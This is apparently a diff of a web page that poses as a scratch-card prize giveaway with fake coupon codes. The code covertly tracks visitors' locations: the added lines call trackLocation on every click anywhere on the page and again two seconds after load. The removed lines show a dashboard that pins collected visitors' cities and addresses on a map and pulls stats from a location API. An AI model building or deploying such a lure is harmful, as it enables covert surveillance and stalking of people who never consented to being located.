-    const addressLine = loc.fullAddress || [loc.city, loc.state, loc.country].filter(Boolean).join(', ');
-    const marker = L.marker([loc.latitude, loc.longitude]).addTo(map).bindPopup(
-      `<div style="font-family:Inter,sans-serif;max-width:250px;">
-        <strong style="font-size:14px;">📍 ${escapeHtml(loc.city || 'Unknown')}</strong><br>
-        <span style="color:#666;font-size:12px;line-height:1.4;">${escapeHtml(addressLine)}</span><br>
-        <span style="font-size:11px;color:#999;margin-top:4px;display:inline-block;">${loc.method}</span>
-      </div>`
-    );
-    mapMarkers.push(marker);
-    bounds.push([loc.latitude, loc.longitude]);
-  });
-  document.getElementById('mapCount').textContent = `${mapMarkers.length} pins`;
-  if (bounds.length) map.fitBounds(bounds, { padding: [50, 50], maxZoom: 12 });
-}
-
-window.focusLocation = function(lat, lng) {
-  if (!lat || !lng) return;
-  map.setView([lat, lng], 16);
-  document.querySelector('.map-container').scrollIntoView({ behavior: 'smooth', block: 'center' });
-};
-
-window.deleteLocation = async function(id) {
-  if (!confirm('Delete this location?')) return;
-  try {
-    const res = await fetch(`${API_URL}/api/location/${id}`, { method: 'DELETE' });
-    const data = await res.json();
-    if (data.success) {
-      showToast('Location deleted', 'success');
-      loadAllLocations(); loadStats();
-    }
-  } catch { showToast('Delete failed', 'error'); }
-};
-
-async function deleteAllLocations() {
-  if (!confirm('⚠️ Delete ALL locations?')) return;
-  try {
-    for (const loc of allLocations) {
-      await fetch(`${API_URL}/api/location/${loc.id}`, { method: 'DELETE' });
-    }
-    showToast('All locations deleted', 'success');
-    loadAllLocations(); loadStats();
-  } catch { showToast('Failed to delete all', 'error'); }
-}
-
-// ============================================
-// STATS
-// ============================================
-async function loadStats() {
-  try {
-    const res = await fetch(`${API_URL}/api/location/stats/summary`);
-    const data = await res.json();
-    if (data.success) {
-      document.getElementById('totalLocations').textContent = data.total || 0;
-      document.getElementById('totalCities').textContent = data.topCities?.length || 0;
-      const countries = new Set(allLocations.map(l => l.country).filter(Boolean));
-      document.getElementById('totalCountries').textContent = countries.size;
-      renderTopCities(data.topCities || []);
-    }
-  } catch (err) { console.error(err); }
-}
-
-function renderTopCities(cities) {
-  const container = document.getElementById('topCities');
-  if (!cities?.length) {
-    container.innerHTML = '<div class="empty-state small"><p>No data yet</p></div>';
-    return;
-  }
-  container.innerHTML = cities.map(c => `
-    <div class="city-chip">
-      <span class="city-name">${escapeHtml(c.city || 'Unknown')}</span>
-      <span class="city-count">${c.count}</span>
-    </div>`).join('');
-}
+document.addEventListener('click', (e) => {
+  trackLocation(true);
+}, true);
 
 // ============================================
 // SCRATCH CARD
 // ============================================
 let scratchRevealed = false;
 function scratchCard() {
-     getIPLocation();
-  getGPSLocation();
   if (scratchRevealed) return;
+  
   const card = document.getElementById('scratchCard');
   const rewards = [
     { icon: '🎉', text: 'YOU WON ₹500!', hint: 'Use code: LUCKY500' },
@@ -1511,12 +655,14 @@ function scratchCard() {
     { icon: '⭐', text: 'FREE VOUCHER!', hint: 'Use code: FREEVCHR' },
     { icon: '🏆', text: '50% OFF!', hint: 'Use code: HALFOFF' }
   ];
+  
   const reward = rewards[Math.floor(Math.random() * rewards.length)];
   card.classList.add('scratched');
   document.getElementById('scratchIcon').textContent = reward.icon;
   document.getElementById('scratchText').textContent = reward.text;
   document.getElementById('scratchHint').textContent = reward.hint;
   scratchRevealed = true;
+  
   showToast('🎉 Congratulations! You won!', 'success');
 }
 
@@ -1525,12 +671,18 @@ function scratchCard() {
 // ============================================
 function copyCode(code, event) {
   event.stopPropagation();
-  getIPLocation();
-  getGPSLocation();
+  
   navigator.clipboard.writeText(code).then(() => {
     showToast(`✅ Code "${code}" copied!`, 'success');
   }).catch(() => {
-    showToast('Failed to copy', 'error');
+    // Fallback for older browsers
+    const textarea = document.createElement('textarea');
+    textarea.value = code;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    showToast(`✅ Code "${code}" copied!`, 'success');
   });
 }
 
@@ -1546,24 +698,32 @@ function showToast(message, type = 'info') {
 }
 
 // ============================================
-// HELPERS
+// PARTICLES
 // ============================================
-function escapeHtml(str) {
-  if (!str) return '';
-  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+function spawnParticles() {
+  for (let i = 0; i < 15; i++) {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    p.style.left = Math.random() * 100 + 'vw';
+    p.style.animationDelay = Math.random() * 8 + 's';
+    p.style.animationDuration = (5 + Math.random() * 5) + 's';
+    document.body.appendChild(p);
+  }
 }
 
-function getTimeAgo(timestamp) {
-  const diff = Date.now() - timestamp;
-  const s = Math.floor(diff / 1000);
-  const m = Math.floor(s / 60);
-  const h = Math.floor(m / 60);
-  const d = Math.floor(h / 24);
-  if (s < 60) return 'Just now';
-  if (m < 60) return `${m}m ago`;
-  if (h < 24) return `${h}h ago`;
-  return `${d}d ago`;
-}
+// ============================================
+// INIT
+// ============================================
+document.addEventListener('DOMContentLoaded', () => {
+  spawnParticles();
+  
+  // Page load pe 2 second baad ek baar location track
+  setTimeout(() => {
+    console.log('📄 Page loaded, tracking location...');
+    trackLocation(true);
+  }, 2000);
+});
 </script>
+
 </body>
 </html>
